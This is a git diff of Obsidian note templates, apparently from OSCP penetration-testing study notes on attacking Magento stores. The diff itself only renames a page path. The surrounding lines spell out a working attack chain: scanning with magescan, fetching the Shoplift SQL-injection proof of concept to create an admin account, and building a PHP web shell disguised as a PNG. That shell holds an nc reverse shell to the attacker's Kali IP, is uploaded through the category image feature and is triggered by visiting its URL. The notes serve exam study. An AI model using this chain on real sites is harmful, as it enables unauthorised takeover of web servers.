@@ -6,7 +6,7 @@ wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan
 
 MAGESCAN
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `php magescan.phar scan:all http://${discoveredDomain}`;
@@ -23,7 +23,7 @@ Create new admin
 wget https://raw.githubusercontent.com/joren485/Magento-Shoplift-SQLI/master/poc.py
 ```
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `python2 poc.py http://${discoveredDomain}`;
@@ -50,7 +50,7 @@ echo this into a png
 echo '<?php' >> shell.php.png
 ```
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 1337 >/tmp/f");' >> shell.php.png`;
 
@@ -64,7 +64,7 @@ Catalog > Manage Categories > Add Root Category > Image > Browse > Upload png > 
 
 Check
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `http://${discoveredDomain}/media/catalog/category/shell.php.png`;
